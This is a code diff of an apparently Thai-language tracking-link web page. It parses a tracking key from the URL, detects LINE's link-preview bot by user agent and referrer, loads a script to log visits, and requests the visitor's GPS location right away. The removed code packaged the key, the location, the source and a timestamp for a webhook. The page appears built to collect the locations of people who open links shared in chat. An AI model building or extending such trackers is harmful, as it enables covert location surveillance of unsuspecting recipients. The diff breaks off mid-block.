@@ -91,36 +91,63 @@
 
   <script>
     // ฟังก์ชันตรวจสอบว่ามี tracking key ที่ถูกต้องหรือไม่
-    function hasValidTrackingKey() {
+    function getUrlParameters() {
       try {
         const urlParams = new URLSearchParams(window.location.search);
         const trackingKey = urlParams.get('daily');
+        const source = urlParams.get('source') || 'link';
+        const preview = urlParams.get('preview') === '1';
+        
         // ตรวจสอบว่า trackingKey มีค่า และไม่ใช่ค่าว่าง หรือ "ไม่มีค่า"
-        return trackingKey && trackingKey.trim() !== "" && trackingKey !== "ไม่มีค่า";
+        const hasValidKey = trackingKey && trackingKey.trim() !== "" && trackingKey !== "ไม่มีค่า";
+        
+        return { 
+          hasValidKey,
+          trackingKey,
+          source, 
+          preview
+        };
       } catch (error) {
         console.error("Error checking tracking key:", error);
-        return false;
+        return { hasValidKey: false };
       }
     }
-
-    // ฟังก์ชันสำหรับส่งข้อมูลไปยัง webhook (ย้ายมาไว้ที่นี่เพื่อให้เรียกใช้ได้)
-    function sendDataToWebhook(trackingKey, location, source) {
-      // สร้างออบเจ็กต์ข้อมูล
-      const data = {
-        trackingKey: trackingKey,
-        source: source, // ระบุว่ามาจากรูปภาพหรือลิงก์
-        location: location, // ข้อมูลตำแหน่ง GPS
-        timestamp: new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' }),
-        // ข้อมูลอื่นๆ จะถูกเพิ่มใน script.js
-      };
-
-      // ส่งข้อมูลไปยัง webhook (URL เดียวกับใน script.js)
-      // การส่งข้อมูลจริงจะทำใน script.js หลังจากรวบรวมข้อมูลครบถ้วน
-      console.log("Prepared data for webhook (will be sent by script.js):", data);
+    
+    // ฟังก์ชันตรวจสอบว่าเป็น LINE Preview Bot หรือไม่
+    function isLinePreviewBot() {
+      const userAgent = navigator.userAgent.toLowerCase();
+      
+      // LINE Preview User-Agent มักจะมี LINE หรือ keywords อื่นๆ
+      const lineKeywords = ['line', 'linecorp', 'line-corp', 'linemessagingapi'];
+      
+      // ถ้ามี LINE keyword ใน User-Agent หรือ Referrer
+      return lineKeywords.some(keyword => userAgent.includes(keyword)) ||
+             (document.referrer && 
+              (document.referrer.includes('line.me') || 
+               document.referrer.includes('line.naver.jp')));
     }
 
-    // ตรวจสอบ tracking key ก่อนที่จะโหลด script.js
-    if (hasValidTrackingKey()) {
+    // ตรวจสอบพารามิเตอร์ และการโหลดจาก LINE Bot
+    const urlParams = getUrlParameters();
+    const isPreviewBot = urlParams.preview && isLinePreviewBot();
+    
+    // กรณีเป็น LINE Preview Bot และมีการเปิดใช้ preview
+    if (isPreviewBot) {
+      console.log("LINE Preview Bot detected with preview=1");
+      // สร้างเนื้อหาพิเศษสำหรับ Preview Bot 
+      // - ให้แสดงหน้าเว็บพื้นฐานที่ LINE Bot จะแสดงตัวอย่าง
+      document.addEventListener('DOMContentLoaded', function() {
+        // ถ้าตรวจพบว่าเป็น Preview และมี tracking key ที่ถูกต้อง
+        if (urlParams.hasValidKey) {
+          // โหลด script.js เพื่อบันทึกข้อมูล
+          const scriptElement = document.createElement('script');
+          scriptElement.src = 'script.js';
+          document.body.appendChild(scriptElement);
+        }
+      });
+    } 
+    // กรณีปกติ - ตรวจสอบเฉพาะ tracking key
+    else if (urlParams.hasValidKey) {
       console.log("Tracking key is valid. Loading main script...");
       
       // ขอสิทธิ์เข้าถึงตำแหน่ง GPS ทันที
